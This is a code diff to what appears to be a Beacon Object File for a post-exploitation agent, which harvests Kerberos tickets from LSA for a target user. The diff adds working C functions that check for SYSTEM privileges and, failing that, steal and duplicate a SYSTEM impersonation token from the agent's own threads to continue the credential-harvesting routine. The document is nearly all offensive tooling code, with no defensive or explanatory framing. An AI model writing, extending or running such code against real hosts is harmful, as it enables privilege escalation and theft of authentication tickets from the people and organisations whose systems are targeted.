@@ -1,6 +1,84 @@
 #include <windows.h>
+#include <tlhelp32.h>
 #include "beacon.h"
 #include "common.h"
+
+// Check current token for SYSTEM privileges
+BOOL IsSystem(){
+    BOOL isSystem = FALSE;
+
+    // Get System SID
+    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
+    PSID systemSid = NULL;
+    ADVAPI32$AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,0,0,0,0,0,0,0, &systemSid);
+    
+    // Check current process token
+    HANDLE hToken = NULL;
+    if (!ADVAPI32$OpenProcessToken((HANDLE)-1, TOKEN_QUERY, &hToken))
+        return FALSE;
+
+    DWORD retLen = 0;
+    ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &retLen);
+    TOKEN_USER* tokenUser = (TOKEN_USER*)MemAlloc(retLen);
+    if (!tokenUser) { 
+        KERNEL32$CloseHandle(hToken); 
+        return FALSE; 
+    }
+
+    if (ADVAPI32$GetTokenInformation(hToken, TokenUser, tokenUser, retLen, &retLen)) {
+        isSystem = ADVAPI32$EqualSid(tokenUser->User.Sid, systemSid);
+        ADVAPI32$FreeSid(systemSid);
+    }
+
+    MemFree(tokenUser);
+    KERNEL32$CloseHandle(hToken);
+    return isSystem;
+}
+
+// Check agent's impersonation token for SYSTEM privileges
+HANDLE StealSystemToken() {
+    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
+    PSID systemSid = NULL;
+    ADVAPI32$AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,0,0,0,0,0,0,0, &systemSid);
+    
+    HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    DWORD pid = KERNEL32$GetCurrentProcessId();
+    HANDLE hDuplicateToken  = NULL;
+
+    THREADENTRY32 thEntry = { sizeof(thEntry) };
+    if (KERNEL32$Thread32First(hSnap, &thEntry)) {
+        do {
+            // Ignore other processes
+            if (thEntry.th32OwnerProcessID != pid) 
+                continue;
+
+            HANDLE hThread = KERNEL32$OpenThread(THREAD_QUERY_INFORMATION, FALSE, thEntry.th32ThreadID);
+            if (!hThread) 
+                continue;
+
+            HANDLE hToken = NULL;
+            if (ADVAPI32$OpenThreadToken(hThread, TOKEN_DUPLICATE | TOKEN_QUERY, FALSE, &hToken)) {
+                
+                DWORD retLen = 0;
+                ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &retLen);
+                TOKEN_USER* tokenUser = (TOKEN_USER*)MemAlloc(retLen);
+                if (tokenUser && ADVAPI32$GetTokenInformation(hToken, TokenUser, tokenUser, retLen, &retLen)) {
+                    // Duplicate SYSTEM token if found
+                    if (ADVAPI32$EqualSid(tokenUser->User.Sid, systemSid)) {
+                        ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDuplicateToken);
+                    }
+                    MemFree(tokenUser);
+                }
+                KERNEL32$CloseHandle(hToken);
+            }
+            KERNEL32$CloseHandle(hThread);
+        } while (!hDuplicateToken && KERNEL32$Thread32Next(hSnap, &thEntry));
+    }
+
+    KERNEL32$CloseHandle(hSnap);
+    ADVAPI32$FreeSid(systemSid);
+    return hDuplicateToken; 
+}
 
 NTSTATUS GetLsaHandle(HANDLE* hLsa) {
     NTSTATUS status = STATUS_SUCCESS;
@@ -294,9 +372,16 @@ VOID go(char* args, int argc) {
     int interval = BeaconDataInt(&parser);
     char* targetUser = BeaconDataExtract(&parser, NULL);
         
-    if (!BeaconIsAdmin()) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[-] Must be run as NT AUTHORITY\\SYSTEM.\n");
-        return;
+    // Check for SYSTEM privileges by checking primary token first
+    if (!IsSystem()){
+        // Fallback to stealing the agent's impersonation token
+        HANDLE hToken = StealSystemToken(); 
+        if (!hToken) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[-] Must be run as NT AUTHORITY\\SYSTEM.\n");
+            return;
+        }
+        ADVAPI32$SetThreadToken(NULL, hToken);
+        KERNEL32$CloseHandle(hToken);
     }
     
     HANDLE hLsa = 0;
@@ -343,6 +428,8 @@ VOID go(char* args, int argc) {
     if (curr.tickets)
         MemFree(curr.tickets);
     SECUR32$LsaDeregisterLogonProcess(hLsa);
+
+    ADVAPI32$RevertToSelf(); 
 
     BeaconPrintf(CALLBACK_OUTPUT, "\n[+] BOF execution completed.\n");
 }
